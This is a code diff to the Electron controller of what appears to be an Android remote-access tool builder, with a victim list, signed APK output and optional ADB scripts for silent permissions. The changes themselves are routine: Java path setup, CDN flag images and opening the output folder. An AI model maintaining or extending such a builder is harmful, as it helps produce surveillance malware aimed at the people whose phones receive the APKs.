@@ -27,6 +27,20 @@ const {
 } = require('path');
 var dir = require("path");
 
+// Ensure Java 11 is discoverable for child processes used during APK build
+const DEFAULT_JAVA_HOME = process.platform === 'win32'
+    ? 'C:\\Program Files\\Eclipse Adoptium\\jdk-11.0.29.7-hotspot'
+    : null;
+if (!process.env.JAVA_HOME && DEFAULT_JAVA_HOME && fs.existsSync(DEFAULT_JAVA_HOME)) {
+    process.env.JAVA_HOME = DEFAULT_JAVA_HOME;
+}
+if (process.env.JAVA_HOME) {
+    const javaBin = path.join(process.env.JAVA_HOME, 'bin');
+    if (!process.env.PATH.toLowerCase().includes(javaBin.toLowerCase())) {
+        process.env.PATH = `${javaBin};${process.env.PATH}`;
+    }
+}
+
 // Fix Constants require path - use path resolution that works in Electron renderer
 let CONSTANTS;
 try {
@@ -74,11 +88,30 @@ var outputPath = dir.join(dataPath, CONSTANTS.outputApkPath);
 var logPath = dir.join(dataPath, CONSTANTS.outputLogsPath);
 //--------------------------------------------------------------
 
-// Country code to emoji flag mapping
+// Country code to flag image (using flagcdn.com for reliable rendering on all OS)
+const countryCodeToFlag = (countryCode) => {
+    if (!countryCode) return { type: 'icon', value: 'globe', title: 'Unknown' };
+    const cc = countryCode.toLowerCase();
+    // Handle special cases
+    if (cc === 'local') return { type: 'icon', value: 'home', title: 'Local Network' };
+    if (cc === 'lan') return { type: 'icon', value: 'linkify', title: 'LAN' };
+    // Validate country code (must be 2 letters)
+    if (!/^[a-z]{2}$/i.test(cc)) return { type: 'icon', value: 'globe', title: 'Unknown' };
+    // Return flag image URL
+    return { 
+        type: 'flag', 
+        value: `https://flagcdn.com/24x18/${cc}.png`,
+        value2x: `https://flagcdn.com/48x36/${cc}.png`,
+        title: cc.toUpperCase()
+    };
+};
+
+// Legacy emoji function (kept for compatibility)
 const countryCodeToEmoji = (countryCode) => {
-    if (!countryCode) return '🌐'; // Globe for unknown location
+    if (!countryCode) return '🌐';
     const cc = countryCode.toUpperCase();
-    // Validate country code (must be 2 uppercase letters)
+    if (cc === 'LOCAL') return '🏠';
+    if (cc === 'LAN') return '🔗';
     if (!/^[A-Z]{2}$/.test(cc)) return '🌐';
     const chars = [...cc].map(c => String.fromCodePoint(0x1F1A5 + c.charCodeAt(0)));
     return chars.join('');
@@ -192,11 +225,16 @@ app.controller("AppCtrl", ($scope, $sce) => {
         return Object.keys(viclist).length;
     };
 
-    // Convert country code to flag emoji
+    // Convert country code to flag image (works on all OS including Windows)
     $appCtrl.getCountryFlag = (countryCode) => {
-        const emoji = countryCodeToEmoji(countryCode);
-        const title = countryCode ? countryCode.toUpperCase() : 'Unknown Location';
-        return $sce.trustAsHtml(`<span class="country-flag" title="${title}">${emoji}</span>`);
+        const flag = countryCodeToFlag(countryCode);
+        if (flag.type === 'icon') {
+            // Use Semantic UI icon for special cases
+            return $sce.trustAsHtml(`<span class="country-flag" title="${flag.title}"><i class="${flag.value} icon"></i></span>`);
+        } else {
+            // Use actual flag image from CDN
+            return $sce.trustAsHtml(`<img class="country-flag-img" src="${flag.value}" srcset="${flag.value2x} 2x" alt="${flag.title}" title="${flag.title}" style="width:24px;height:18px;vertical-align:middle;border-radius:2px;box-shadow:0 1px 3px rgba(0,0,0,0.3);">`);
+        }
     };
 
     // Wait for DOM to be ready and initialize UI components
@@ -735,6 +773,16 @@ app.controller("AppCtrl", ($scope, $sce) => {
                         // Store the output path for easy access
                         $appCtrl.lastBuiltApkPath = signedApkPath;
                         $appCtrl.lastOutputFolder = outputPath;
+                        
+                        // Offer to open the output folder automatically
+                        try {
+                            delayedLog('[→] Opening output folder...', CONSTANTS.logStatus.INFO);
+                            if (shell && shell.showItemInFolder) {
+                                shell.showItemInFolder(signedApkPath);
+                            }
+                        } catch (e) {
+                            console.warn('Failed to open output folder:', e);
+                        }
                         
                         // Generate ADB script for silent permissions if enabled
                         if ($appCtrl.silentPermOptions && $appCtrl.silentPermOptions.generateAdbScript) {
@@ -1511,7 +1559,10 @@ echo "[!] Note: Some permissions may require manual approval on Android 10+"
 
 // Function to check if Java version 11 is installed
 function checkJavaVersion(callback) {
-    execCallback('java -version',
+    const javaCmd = process.env.JAVA_HOME
+        ? `"${path.join(process.env.JAVA_HOME, 'bin', 'java')}"`
+        : 'java';
+    execCallback(`${javaCmd} -version`,
         (error, stdout, stderr) => {
             if (error) {
                 callback(new Error('Java is not installed or not accessible.'));
@@ -1545,10 +1596,8 @@ function resetDelayedLog() {
 }
 
 function writeErrorLog(errorMessage, errorType) {
-    // Check if the log directory exists, if not then create it
-    if (!fs.existsSync(logPath)) {
-        fs.mkdirSync(logPath);
-    }
+    // Ensure log directory exists
+    fs.ensureDirSync(logPath);
 
     const timestamp = new Date().toISOString();
     const logEntry = `[${timestamp}] ${errorMessage}\n`;
